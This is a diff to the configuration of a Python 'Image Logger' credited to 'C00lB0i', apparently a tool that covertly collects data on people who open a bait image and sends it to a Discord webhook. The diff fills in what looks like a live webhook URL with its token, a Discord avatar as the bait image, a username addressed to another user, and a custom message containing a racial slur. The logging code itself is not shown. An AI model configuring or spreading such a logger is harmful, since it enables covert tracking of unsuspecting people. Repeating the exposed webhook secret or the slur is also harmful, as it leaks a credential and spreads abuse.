@@ -12,13 +12,13 @@ __author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1402909751905353738/7FZmI0oYznA4nh2b7FwQ8jdTnwk08ZMD5x8eMC2QH8qEnKOuWT2cMk1fQnyRy4AHwfYr",
+    "image": "https://cdn.discordapp.com/avatars/1148376193339494541/45d3804f1841d70e5e8fda9de3362e1b.webp?size=1024", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "username": "@vexyhd here you go ", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
@@ -28,7 +28,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by C00lB0i's Image Logger. https://github.com/OverPowerC", # Message to show
+        "message": "fuck nigga its not working rn", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
